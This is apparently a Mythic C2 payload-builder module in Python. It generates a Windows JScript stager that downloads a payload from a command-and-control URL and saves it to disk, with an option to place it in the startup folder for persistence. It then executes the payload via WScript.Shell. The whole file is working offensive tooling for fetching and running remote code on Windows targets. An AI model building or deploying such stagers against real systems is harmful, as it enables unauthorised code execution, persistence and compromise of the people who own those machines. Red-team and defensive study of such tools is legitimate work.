import logging
import pathlib
import traceback
from mythic_container.PayloadBuilder import *
from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *
import mslex
import json
import os
import shutil
import base64
import random

from jscript.agent_functions.jscript_parts import *

class jscript_download_save_execute(PayloadType):
    name = "jscript_download_save_execute"
    file_extension = "js"
    author = "@hegusung"
    supported_os = [SupportedOS.Windows]
    wrapper = True
    wrapped_payloads = ["*"]
    note = """Downloads a payload from the C2, save it on disk and execute"""
    translation_container = None # "myPythonTranslation"
    agent_path = pathlib.Path(".") / "jscript"
    agent_icon_path = agent_path / "agent_functions" / "jscript.svg"
    agent_code_path = agent_path / "agent_code"
    build_parameters = [
        BuildParameter(
            name = "download_method",
            parameter_type=BuildParameterType.ChooseOne,
            choices=['Microsoft.XMLHTTP', 'Msxml2.XMLHTTP', 'WinHttp.WinHttpRequest.5.1'],
            default_value="Msxml2.XMLHTTP",
            description="Defines the method to download the payload",
        ),
        BuildParameter(
            name = "url",
            parameter_type=BuildParameterType.String,
            description="Payload URL",
        ),
        BuildParameter(
            name = "path",
            parameter_type=BuildParameterType.String,
            default_value="%APPDATA%\\sample.exe",
            description="Location where to save payload on disk, set to startup folder for startup folder persistence",
        ),
        BuildParameter(
            name = "exec_method",
            parameter_type=BuildParameterType.ChooseOne,
            choices=['WScript.Shell_Run', 'WScript.Shell_Exec'],
            default_value="WScript.Shell_Run",
            description="Defines the method to execute",
        ),
    ]

    build_steps = [
    ]

    async def build(self) -> BuildResponse:
        # this function gets called to create an instance of your payload
        resp = BuildResponse(status=BuildStatus.Success)
        # create the payload
        build_msg = ""

        try:
            strings = []
            payload_args = {}

            url = self.get_parameter('url')
            path = self.get_parameter('path')

            payload = ""

            # Download
            payload = jscript_download(payload, url, path, comhttp=self.get_parameter('download_method'))

            # Execution
            if self.get_parameter('exec_method') == 'WScript.Shell_Run':
                payload = jscript_WScriptShell_Run(payload, "var:path")
            elif self.get_parameter('exec_method') == 'WScript.Shell_Exec':
                payload = jscript_WScriptShell_Exec(payload, "var:path")

            # we need to encode the command string with escape quotes
            payload = payload.replace(path, path.replace("\\", "\\\\").replace("\"", "\\\""))

            resp.payload = payload.format(**payload_args)
            resp.build_message = "Successfully built!\n"

        except Exception as e:
            traceback.print_exc()

            resp.set_status(BuildStatus.Error)
            resp.build_stderr = "Error building payload: " + str(e)
        return resp
